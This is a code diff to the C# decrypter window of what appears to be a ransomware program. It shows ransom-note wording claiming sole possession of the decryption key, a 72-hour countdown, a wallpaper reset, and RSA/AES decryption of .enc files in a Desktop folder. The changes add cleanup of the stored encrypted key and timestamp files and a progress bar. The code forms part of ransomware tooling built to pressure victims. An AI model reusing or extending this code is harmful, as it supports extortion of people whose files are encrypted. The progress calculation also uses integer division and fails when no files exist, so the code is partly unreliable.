@@ -19,7 +19,6 @@ namespace Decrypter
 {
     public partial class Mainform : Form
     {
-        private string startTimeFilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemRoot"), "Temp/c.txt");
         private readonly TimeSpan countdownDuration = new TimeSpan(72, 0, 0);
         private DateTime? startTime;
         private TimeSpan timeLeft;
@@ -226,6 +225,7 @@ Only we possess the decryption key. Any other solution is futile. \line
 
         private void InitializeCountdown()
         {
+            string startTimeFilePath = Path.Combine(tempPath, "timestamp.txt");
             // Prüfen, ob die Startzeit bereits gespeichert ist
             if (File.Exists(startTimeFilePath))
             {
@@ -322,14 +322,27 @@ hh\:mm tt", CultureInfo.InvariantCulture);
             this.decrypt_button.Enabled = false;
             this.DecryptFiles();
             this.ResetWallpaper();
+            string encryptedAESKeyPath = Path.Combine(tempPath, "encrypted_AES_Key.bin");
+            string startTimeFilePath = Path.Combine(tempPath, "timestamp.txt");
+            if(File.Exists(encryptedAESKeyPath))
+            {
+                File.Delete(encryptedAESKeyPath);
+            }
+            if(File.Exists(startTimeFilePath))
+            {
+                File.Delete(startTimeFilePath);
+            }
+            this.countdown.Stop();
             MessageBox.Show("Decryption completed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            this.progressBar1.Visible = false;
+            this.decrypt_button.Enabled = true;
         }
 
         // Decryption Logic ---------------------------------
         // Paths
         private void InitializePaths()
         {
-            tempPath = Path.Combine(Environment.GetEnvironmentVariable("SystemRoot"), "Temp");
+            tempPath = Environment.GetEnvironmentVariable("TEMP");
             folderToDecrypt = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Wallpaper");
             decrypterFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         }
@@ -380,12 +393,17 @@ hh\:mm tt", CultureInfo.InvariantCulture);
                     byte[] aesKey = rsa.Decrypt(encryptedAESKey, false);
 
                     var encryptedFiles = Directory.GetFiles(folderToDecrypt, "*.enc");
+
+                    // set pro progress steps
+                    double step = 100 / encryptedFiles.Length;
                     foreach (var file in encryptedFiles)
                     {
                         string outputFile = Path.Combine(folderToDecrypt, Path.GetFileNameWithoutExtension(file));
                         DecryptFile(file, outputFile, aesKey);
                         File.Delete(file);
+                        this.progressBar1.Value +=  (int) step;
                     }
+                    this.progressBar1.Value = 100;
                 }
             }
             catch (CryptographicException ex)
